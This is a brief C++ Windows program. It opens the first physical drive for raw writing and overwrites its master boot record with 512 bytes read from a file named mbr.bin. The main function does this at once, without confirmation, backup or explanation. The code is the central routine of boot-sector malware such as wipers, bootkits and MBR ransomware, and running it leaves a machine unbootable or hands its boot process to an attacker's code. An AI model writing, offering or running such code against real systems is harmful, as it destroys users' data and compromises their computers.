#include <windows.h>

bool ReplaceMBR(const char* mbrFilePath) {
    HANDLE hDisk = CreateFileA(
        "\\\\.\\PhysicalDrive0", 
        GENERIC_WRITE, 
        FILE_SHARE_READ, 
        NULL, 
        OPEN_EXISTING, 
        0, 
        NULL
    );

    if (hDisk == INVALID_HANDLE_VALUE) return false;

    HANDLE hFile = CreateFileA(
        mbrFilePath, 
        GENERIC_READ, 
        FILE_SHARE_READ, 
        NULL, 
        OPEN_EXISTING, 
        FILE_ATTRIBUTE_NORMAL, 
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hDisk);
        return false;
    }

    BYTE mbrData[512];
    DWORD bytesRead;
    if (!ReadFile(hFile, mbrData, 512, &bytesRead, NULL)) {
        CloseHandle(hFile);
        CloseHandle(hDisk);
        return false;
    }

    DWORD bytesWritten;
    if (!WriteFile(hDisk, mbrData, 512, &bytesWritten, NULL)) {
        CloseHandle(hFile);
        CloseHandle(hDisk);
        return false;
    }

    CloseHandle(hFile);
    CloseHandle(hDisk);
    return true;
}

int main() {
    const char* mbrFilePath = "mbr.bin";
    ReplaceMBR(mbrFilePath);
    return 0;
}